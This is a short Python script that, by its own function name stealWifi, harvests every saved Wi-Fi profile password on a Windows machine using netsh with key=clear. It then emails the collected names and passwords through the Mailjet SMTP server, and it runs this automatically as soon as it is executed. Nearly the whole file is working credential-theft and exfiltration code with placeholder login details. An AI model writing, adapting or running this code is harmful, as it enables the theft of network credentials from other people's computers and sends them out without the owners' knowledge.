
import subprocess,smtplib,re
def sendEmail(mailid,username,password):
    #configure smtp server
    server=smtplib.SMTP("in-v3.mailjet.com",587)
    #now start tls for better security
    server.starttls()
    #login to the server
    server.login(username,password)
    #send mail to our mailid  parameters--->from address,to address,msg
    server.sendmail(mailid,mailid,msg=stealWifi())
    server.quit()



def stealWifi():
    #result=subprocess.check_output('netsh wlan show profile name="Rack CCNA-CCNP" key=clear',shell=True)
    #for that first comment 
    AccessPointPasswordList=[]
    command1="netsh wlan show profile"
    profileNames=subprocess.check_output(command1,shell=True)
    #for converting byte type to string type
    profileNames=profileNames.decode("utf-8")
    nameList=re.findall("(?:Profile\s*:\s)(.*)",profileNames)
    #extract all profiles in name list
    for names in nameList:
        passwordString=subprocess.check_output(command1+' name="'+names+'" '+"key=clear",shell=True).decode("utf-8")
        passw=re.search("(?:Key\sContent\s*:\s)(.*)",passwordString)
        AccessPointPasswordList.append(("{ wifi name and password: "+names+"  --- "+passw.group(1)+" }"))
    #print(AccessPointPasswordList)
    passwordString=" ".join(AccessPointPasswordList)

    #for that we need to return our string as msg to sendMailfunction
    return passwordString

sendEmail(mailid="email",username="username" ,password="password")

#call the function
#stealWifi()








